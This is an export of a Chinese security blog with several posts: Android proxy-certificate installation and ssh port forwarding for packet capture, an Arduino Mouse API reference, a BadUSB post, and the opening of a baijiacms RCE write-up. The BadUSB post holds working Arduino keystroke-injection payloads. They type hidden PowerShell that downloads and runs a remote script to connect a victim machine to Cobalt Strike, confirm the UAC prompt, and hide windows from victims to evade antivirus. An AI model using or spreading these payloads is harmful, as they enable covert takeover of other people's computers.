<h2 id="Fiddler-classic"><a href="#Fiddler-classic" class="headerlink" title="Fiddler classic"></a>Fiddler classic</h2><p>下载：<a class="link" href="https://www.telerik.com/">https://www.telerik.com<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20230409210332490.png" alt="image-20230409210332490"></p>
<p>Fiddler Classic（经典版），这个版本是<strong>免费</strong>的，不过只能在Windows上使用。</p>
<p>Fiddler Everywhere可以在所有平台使用，并且相当于Fiddler Classic+postman，但是是<strong>收费</strong>的。</p>
<p>如果只作为抓包工具经典版就够用了，可以直接点击下方链接前往下载页面。</p>
<p>邮箱和地址随便填就行了</p>
<p>fiddler使用教程可以看：</p>
<p><a class="link" href="https://juejin.cn/post/7021763777460699150">https://juejin.cn/post/7021763777460699150<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/hong-fithing/p/7582947.html">https://www.cnblogs.com/hong-fithing/p/7582947.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><h3 id="burp证书"><a href="#burp证书" class="headerlink" title="burp证书"></a>burp证书</h3><ol>
<li>获取证书</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">挂上代理后，访问 https://burp 下载证书，即 cacert.der。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>将证书转换为移动设备用户凭据文件（Ubuntu 16.04）</li>
</ol>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换为 *.pem 文件</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform DER -in cacert.der -out cacert.pem</span></span><br><span class="line"><span class="comment"># 回显某一 hash 值</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1</span></span><br><span class="line">9a5ba575</span><br><span class="line"><span class="comment"># 将 *.pem 重命名为 &lt;hash&gt;.0</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># mv cacert.pem 9a5ba575.0</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>安装证书(手机已Root)</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 &lt;hash&gt;.0 传到手机</span></span><br><span class="line">adb push 9a5ba575.0 /sdcard/</span><br><span class="line"><span class="comment"># adb连接至设备</span></span><br><span class="line">adb shell</span><br><span class="line"><span class="comment"># shell获取root权限</span></span><br><span class="line">su</span><br><span class="line"><span class="comment"># 系统重新挂载</span></span><br><span class="line">mount -o rw,remount /</span><br><span class="line">mount -o rw,remount /system</span><br><span class="line"><span class="comment"># 复制 &lt;hash&gt;.0 </span></span><br><span class="line">cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/</span><br><span class="line"><span class="comment"># 授权，644 rw-r--r--，本用户有可读可写权限，群组有只读权限，其他用户为只读权限。</span></span><br><span class="line">chmod 644 /system/etc/security/cacerts/9a5ba575.0</span><br><span class="line"><span class="comment"># 重启手机</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p><img src="image-20230409205716080.png" alt="image-20230409205716080"></p>
<ol start="4">
<li>验证</li>
</ol>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">设置-&gt;安全性和位置信息-&gt;加密与凭据-&gt;信任的凭据（显示信任的CA证书）-&gt;系统-&gt;PortSwigger</span><br></pre></td></tr></table></figure>

<p><img src="image-20230409205900977.png" alt="image-20230409205900977"></p>
<h3 id="Fillder证书"><a href="#Fillder证书" class="headerlink" title="Fillder证书"></a>Fillder证书</h3><ol>
<li>获取证书</li>
</ol>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">两种方式：</span><br><span class="line"><span class="number">1</span>) 挂上代理 http:<span class="comment">//&lt;本机ip&gt;:8888 下载证书，点击 FiddlerRoot certificate 进行下载，即 FiddlerRoot.cer。</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）Fiddler-&gt;Tools-&gt;Options-&gt;HTTPS-&gt;Actions-&gt;Export Root Certificate to Desktop,将 FiddlerRoot.cer证书导出至桌面。</span><br><span class="line">(如果Export Root Certificate to Desktop按钮是灰色的，需要点击下面的Decrypt HTTPS traffic)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>将证书转换为移动设备用户凭据文件（Ubuntu 16.04）</li>
</ol>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform DER -in FiddlerRoot.cer -out F.pem</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform PEM -subject_hash_old -in F.pem |head -1</span></span><br><span class="line">269953fb</span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># mv F.pem 269953fb.0</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>安装证书(手机已Root)</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push 269953fb.0 /sdcard/</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">mount -o rw,remount /</span><br><span class="line">mount -o rw,remount /system</span><br><span class="line">cp /sdcard/269953fb.0 /system/etc/security/cacerts/</span><br><span class="line">chmod 644 /system/etc/security/cacerts/269953fb.0</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230409211627886.png" alt="image-20230409211627886"></p>
<ol start="4">
<li>验证</li>
</ol>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">设置-&gt;安全性和位置信息-&gt;加密与凭据-&gt;信任的凭据（显示信任的CA证书）-&gt;系统-&gt;DO_NOT_TRUST_FiddlerRoot</span><br></pre></td></tr></table></figure>

<p><img src="image-20230409211803361.png" alt="image-20230409211803361"></p>
<ol start="5">
<li>抓包配置</li>
</ol>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">Fiddler-&gt;Tools-&gt;Connecttions-&gt;Allow remote computers to conect</span><br></pre></td></tr></table></figure>

<p><img src="1702434-20200804102944950-1222750935.png" alt="img"></p>
<h3 id="burp证书2"><a href="#burp证书2" class="headerlink" title="burp证书2"></a>burp证书2</h3><p>在安卓版本高于10的情况下，使用之前的方法添加证书，会在挂载这步卡住，如下图：</p>
<p><img src="image-20240125222602117.png" alt="image-20240125222602117"></p>
<p>所以需要使用别的方法来添加证书。来源：<a class="link" href="https://blog.csdn.net/qq_42923605/article/details/126870645">https://blog.csdn.net/qq_42923605/article/details/126870645<i class="fas fa-external-link-alt"></i></a></p>
<p>原理很简单，就相当于刷模块来达到修改的目的。所以需要刷好了面具才行。</p>
<p>1.在/data/adb/modules/目录下随便找一个模块，这里我找的是shamiko模块，在里面创建一个system文件夹，然后在里面创建证书的那一层层路径，最后把证书丢进去。所以我这里证书完整路径为/data/adb/modules/zygisk_shamiko/system/etc/security/cacerts/</p>
<p><img src="ec260b71351449c476fff3538efdfc94_720.png" alt="ec260b71351449c476fff3538efdfc94_720"></p>
<p><img src="df33d54d91ba1b58ccb04533d0f17a9d_720.png" alt="df33d54d91ba1b58ccb04533d0f17a9d_720"></p>
<p>随后重启手机，就可以在/system/etc/security/cacerts/路径下看到证书了，系统设置中也可以看到PostSwigger了。</p>
<p><img src="image-20240125224341424.png" alt="image-20240125224341424"></p>
<p><img src="ec2d0771e46db4ffad50f00b28f45c8d_720.png" alt="ec2d0771e46db4ffad50f00b28f45c8d_720"></p>
<h1 id="问题1：本地转发抓包"><a href="#问题1：本地转发抓包" class="headerlink" title="问题1：本地转发抓包"></a>问题1：本地转发抓包</h1><p>把burp设置成系统代理后，抓到一个app的包，但是host地址是127.0.0.1:30000,很显然这不是我电脑上的，也不是一个远程地址，那就只能是手机上某个app开放的端口了</p>
<p><img src="image-20230409224824561.png" alt="image-20230409224824561"></p>
<p>查看发现是app启动的端口：</p>
<p><img src="image-20230409224929423.png" alt="image-20230409224929423"></p>
<p>但是我在电脑上是访问不到这个端口的</p>
<p><img src="image-20230409225039386.png" alt="image-20230409225039386"></p>
<p>经过学长指导，决定用ssh转发获取返回包</p>
<p>termux安装ssh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 换源</span><br><span class="line">sed -i &#39;s@^\(deb.*stable main\)$@#\1\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;termux-packages-24 stable main@&#39; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line">sed -i &#39;s@^\(deb.*games stable\)$@#\1\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;game-packages-24 games stable@&#39; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;game.list</span><br><span class="line"></span><br><span class="line">sed -i &#39;s@^\(deb.*science stable\)$@#\1\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;science-packages-24 science stable@&#39; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;science.list</span><br><span class="line"></span><br><span class="line"># 更新</span><br><span class="line">pkg update</span><br><span class="line"></span><br><span class="line"># 安装ssh</span><br><span class="line">pkg install openssh</span><br><span class="line"></span><br><span class="line"># 打开ssh</span><br><span class="line">sshd</span><br><span class="line"></span><br><span class="line"># 创建密码</span><br><span class="line">passwd</span><br></pre></td></tr></table></figure>

<p>手机上的ssh默认端口是8022，需要注意下，下图就是登录成功的界面</p>
<p><img src="image-20230409225627594.png" alt="image-20230409225627594"></p>
<p>在测试可以登录后，就可以开始监听了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 30000:127.0.0.1:30000 root@192.168.0.3 -p 8022</span><br></pre></td></tr></table></figure>

<p>其中192.168.0.3是手机的ip地址，127.0.0.1:30000是转发的目的地址机器端口，30000是本地一个闲置端口（这个可以任意取，但是我为了方便，即让抓来的包不做任何修改就可以直接发送并获取返回包，就改成了这个）。</p>
<p><img src="image-20230409230215711.png" alt="image-20230409230215711"></p>
<p>现在我在burp上抓到包后，直接send，就可以有返回包了</p>
<p><img src="image-20230409231834652.png" alt="image-20230409231834652"></p>
<h1 id="问题2：wsl2使用adb"><a href="#问题2：wsl2使用adb" class="headerlink" title="问题2：wsl2使用adb"></a>问题2：wsl2使用adb</h1><p>在wsl2中连接不到手机，需要用到ip连接（需要在同一个局域网下），具体为以下几步</p>
<ol>
<li>物理机中先插上数据线，adb连接好，然后输入 adb <a class="link" href="https://so.csdn.net/so/search?q=tcpip&spm=1001.2101.3001.7020">tcpip<i class="fas fa-external-link-alt"></i></a> 5555</li>
</ol>
<p><img src="image-20230411235125638.png" alt="image-20230411235125638"></p>
<ol start="2">
<li>拔下数据线，来到wsl2中，确保可以ping通手机，输入  adb connect 192.168.0.3 。（后面的ip是手机ip）</li>
</ol>
<p><img src="image-20230412000125984.png" alt="image-20230412000125984"></p>
<p><img src="image-20230412000143124.png" alt="image-20230412000143124"></p>
<p>fine</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>app抓包：<a class="link" href="https://mp.weixin.qq.com/s/xDvxKJPdqf7AfJSfuWHZ0g">https://mp.weixin.qq.com/s/xDvxKJPdqf7AfJSfuWHZ0g<i class="fas fa-external-link-alt"></i></a><br>新版magisk隐藏root：<a class="link" href="https://zhuanlan.zhihu.com/p/506203078">https://zhuanlan.zhihu.com/p/506203078<i class="fas fa-external-link-alt"></i></a><br>Android 8.1 导入Burp、Fiddler证书: <a class="link" href="https://www.cnblogs.com/cijian9000/p/13431754.html">https://www.cnblogs.com/cijian9000/p/13431754.html<i class="fas fa-external-link-alt"></i></a><br>frida(hook工具)的环境搭建：<a class="link" href="https://www.cnblogs.com/tjp40922/p/11353808.html">https://www.cnblogs.com/tjp40922/p/11353808.html<i class="fas fa-external-link-alt"></i></a><br>Fiddler抓包(下载安装及使用)：<a class="link" href="https://juejin.cn/post/7021763777460699150">https://juejin.cn/post/7021763777460699150<i class="fas fa-external-link-alt"></i></a><br>Termux 高级终端安装使用配置教程：<a class="link" href="https://www.sqlsec.com/2018/05/termux.html">https://www.sqlsec.com/2018/05/termux.html<i class="fas fa-external-link-alt"></i></a><br>彻底搞懂SSH端口转发命令：<a class="link" href="https://zhuanlan.zhihu.com/p/148825449">https://zhuanlan.zhihu.com/p/148825449<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>asp、aspx、php、jsp万能密码大全</title>
    <url>/2020/11/22/asp%E3%80%81aspx%E3%80%81php%E3%80%81jsp%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14018269.html">源地址：https://www.cnblogs.com/This-is-Y/p/14018269.html<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h1><h1 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h1><h1 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h1><h1 id><a href="#" class="headerlink" title></a></h1><p>  jsp</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>arduino的mouse使用</title>
    <url>/2021/03/28/arduino%E7%9A%84mouse%E4%BD%BF%E7%94%A8-This-is-Y/</url>
    <content><![CDATA[<p>&lt;主要来源于：<a class="link" href="https://www.arduino.cc/en/Reference.MouseKeyboard&gt;">https://www.arduino.cc/en/Reference.MouseKeyboard&gt;<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="各种函数"><a href="#各种函数" class="headerlink" title="各种函数"></a>各种函数</h1><h2 id="begin"><a href="#begin" class="headerlink" title="begin()"></a>begin()</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>开始模拟连接到计算机的鼠标。 必须在控制计算机之前调用begin()。 要结束控制，请使用Mouse.end()。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.begin()</code></p>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>无</p>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
<h2 id="click"><a href="#click" class="headerlink" title="click()"></a>click()</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>向光标所在位置的计算机发送短暂的点击。这与按下(press)并立即释放(release)鼠标按钮是相同的。<br>click()默认为鼠标左键。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>Mouse.click()<br>Mouse.click(button)</p>
<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>button:按下的鼠标按钮允许的数据类型： char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code> </p>
<h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
<h2 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>停止模拟连接到计算机的鼠标。 要开始控制，请使用Mouse.begin（）。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.end()</code></p>
<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>无</p>
<h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
<h2 id="move"><a href="#move" class="headerlink" title="move()"></a>move()</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>在连接的计算机上移动光标。 屏幕上的运动总是相对于光标的当前位置。 使用Mouse.move（）之前，必须先调用Mouse.begin（） </p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.move(xVal, yVal, wheel)</code></p>
<h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>xVal: 沿x轴移动的量。 允许的数据类型: signed char.<br>yVal: 沿y轴移动的量。 允许的数据类型: signed char.<br>wheel: 移动滚轮的数量。 允许的数据类型: signed char.</p>
<h3 id="返回值-3"><a href="#返回值-3" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
<h2 id="press"><a href="#press" class="headerlink" title="press()"></a>press()</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>将按钮按下发送到连接的计算机。 按下相当于单击并连续按住鼠标按钮。 通过Mouse.release（）取消了按下。<br>在使用Mouse.press（）之前，您需要开始与Mouse.begin（）进行通信。<br>Mouse.press（）默认为鼠标左键按下。</p>
<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.press()</code><br><code>Mouse.press(button)</code></p>
<h3 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
<h3 id="返回值-4"><a href="#返回值-4" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
<h2 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>发送一条消息，指出先前按下的按钮（通过Mouse.press（）调用）已释放。 Mouse.release（）默认为左侧按钮。</p>
<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.release()</code><br><code>Mouse.release(button)</code></p>
<h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
<h3 id="返回值-5"><a href="#返回值-5" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
<h2 id="isPressed"><a href="#isPressed" class="headerlink" title="isPressed()"></a>isPressed()</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>检查所有鼠标按钮的当前状态，并报告是否按下任何鼠标按钮。</p>
<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.isPressed();</code><br><code>Mouse.isPressed(button);</code></p>
<h3 id="参数-6"><a href="#参数-6" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
<h3 id="返回值-6"><a href="#返回值-6" class="headerlink" title="返回值"></a>返回值</h3><p>报告按钮是否被按下。数据类型:bool。</p>
]]></content>
  </entry>
  <entry>
    <title>badusb整理</title>
    <url>/2022/01/08/badusb%E6%95%B4%E7%90%86-This-is-Y/</url>
    <content><![CDATA[<p>badusb整理</p>
<p>badusb,目前我手上有的有两种，digispark和 leonardo，淘宝上都有，随便买</p>
<p>两类开发板适用的代码有区别，个人感觉leonardo的更好用，</p>
<h2 id="digispark"><a href="#digispark" class="headerlink" title="digispark"></a>digispark</h2><p>打开arduino，工具-开发板-Digistump AVR Boards-Digispark(Default-16.5mhz)</p>
<p>然后开始写代码就行了</p>
<p><img src="image-20220108110030720.png" alt="image-20220108110030720"></p>
<p>代码要写入到设备时，点击上传，等他出现编译好后，会出现</p>
<p><img src="image-20220108111150309.png" alt="image-20220108111150309"></p>
<p>这时候把badusb插入就好了。</p>
<h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>这个payload是用win+r打开运行窗口，执行powershell上线cs的命令，缺点是火绒会拦截执行隐藏powershell这一行为，目前还没想到怎么绕过。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_ESC     41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_SHIFT 225</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CAPS_LOCK  57</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);<span class="comment">//按R和win键，打开运行</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);<span class="comment">//按CAP绕过输入法</span></span><br><span class="line">DigiKeyboard.print(<span class="string">&quot;powershell -w Normal -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://ip:port/payload.ps1&#x27;);&quot;</span>);</span><br><span class="line">DigiKeyboard.sendKeyPress(<span class="number">0</span>);<span class="comment">//松开</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT,MOD_CONTROL_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>,KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyPress(<span class="number">0</span>);<span class="comment">//松开</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">750</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);</span><br><span class="line">DigiKeyboard.sendKeyPress(<span class="number">0</span>);<span class="comment">//松开</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="leonardo"><a href="#leonardo" class="headerlink" title="leonardo"></a>leonardo</h2><p>打开arduino，工具-开发板-Arduino AVR Boards-Arduino Leonardo</p>
<p><img src="image-20220108111436120.png" alt="image-20220108111436120"></p>
<p>然后插入设备，选择端口，</p>
<p><img src="image-20220108111622289.png" alt="image-20220108111622289"></p>
<p>这个开发板需要把代码写入设备时，直接点上传就好了</p>
<h3 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1"></a>payload1</h3><p>这个payload是win+打开命令窗口。执行powershell命令，然后用ctrl+shift+enter的方式，以管理员身份执行命令（以获取管理员权限），然后用alt+Y绕过UAC，缺点是火绒同样会拦截执行隐藏powershell这一行为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Mouse.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    delay(<span class="number">5000</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI);</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    Keyboard.releaseAll();</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    </span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.print(<span class="string">&quot;powershell -w Normal -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://ip:port/payload&#x27;);&quot;</span>);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    </span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line">    Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line">    Keyboard.press(KEY_RETURN);</span><br><span class="line">    Keyboard.releaseAll();</span><br><span class="line">    delay(<span class="number">1500</span>);</span><br><span class="line">    </span><br><span class="line">    Keyboard.press(KEY_LEFT_ALT);</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;y&#x27;</span>);  </span><br><span class="line">    Keyboard.releaseAll();  </span><br><span class="line">    delay(<span class="number">1500</span>);</span><br><span class="line">    </span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>这个payload是打开一个命令行窗口，然后让他最小化，让受害者不能第一时间看到代码，这样操作更容易绕过一些杀软，也有更多的操作空间</p>
<p>具体命令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Keyboard.begin();<span class="comment">//开始键盘通讯</span></span><br><span class="line">delay(<span class="number">300</span>);<span class="comment">//延时</span></span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win 键</span></span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">Keyboard.press(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r 键</span></span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI); </span><br><span class="line">Keyboard.release(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">Keyboard.println(<span class="string">&quot;cmd /T:01 /K \&quot;@echo off &amp;&amp; mode con:COLS=15 LINES=1\&quot;&quot;</span>);  <span class="comment">//使用最小化隐藏cmd 窗口</span></span><br><span class="line"><span class="comment">//cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN </span></span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN); </span><br><span class="line">Keyboard.release(KEY_RETURN); </span><br><span class="line">delay(<span class="number">200</span>); </span><br><span class="line"></span><br><span class="line">Keyboard.println(<span class="string">&quot;powershell&quot;</span>);</span><br><span class="line">delay(<span class="number">50</span>);</span><br><span class="line">Keyboard.println(<span class="string">&quot;$clnt = new-object system.net.webclient;&quot;</span>); </span><br><span class="line">delay(<span class="number">50</span>); <span class="comment">//短暂的延迟一下，太快会导致代码出错</span></span><br><span class="line">Keyboard.println(<span class="string">&quot;$url=&#x27;http://ip:port/payload&#x27;;&quot;</span>); <span class="comment">//ip，端口，payload，确保可以访问</span></span><br><span class="line">delay(<span class="number">50</span>);</span><br><span class="line">Keyboard.println(<span class="string">&quot;$file = \&quot;E:\\payload\\test1\&quot;;&quot;</span>); <span class="comment">//下载到目标存放文件的地址，文件路径要\\</span></span><br><span class="line">delay(<span class="number">50</span>);</span><br><span class="line">Keyboard.println(<span class="string">&quot;$clnt.downloadfile($url,$file);&quot;</span>);  <span class="comment">//用分段执行绕过进程防护Keyboard.println(&quot;c:\\windows\\temp\\hy.exe&quot;); //这里可以自行研究隐藏文件放到D盘，因为C盘可能没权限。思路：可使用attrib +h 1.txt 将文件隐藏</span></span><br><span class="line"></span><br><span class="line">Keyboard.println(<span class="string">&quot;exit&quot;</span>);<span class="comment">//退出当前powershell窗口</span></span><br><span class="line">delay(<span class="number">3000</span>);<span class="comment">//等待下载完成，</span></span><br><span class="line">Keyboard.println(<span class="string">&quot;exit&quot;</span>); <span class="comment">//退出cmd小窗口</span></span><br><span class="line">Keyboard.press(KEY_RETURN); </span><br><span class="line">Keyboard.release(KEY_RETURN); </span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK); </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK); </span><br><span class="line">Keyboard.end();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>baijiacmsV4 后台RCE</title>
    <url>/2022/11/20/baijiacmsV4-RCE-This-is-Y/</url>
    <content><![CDATA[<p>项目地址：<a class="link" href="https://github.com/baijiacms/baijiacmsV4">https://github.com/baijiacms/baijiacmsV4<i class="fas fa-external-link-alt"></i></a><br>版本：V4.1.4 20170105 FINAL<br>环境：</p>
<ul>
<li>php 5.5.38</li>
<li>nginx 1.15</li>
<li>mysql 5.7.27</li>
<li>20.04.1-Ubuntu</li>
</ul>
<p>漏洞点在文件includes/baijiacms/common.inc.php<br>第654行。</p>
<p><img src="image-20221120231144576.png" alt="image-20221120231144576"></p>
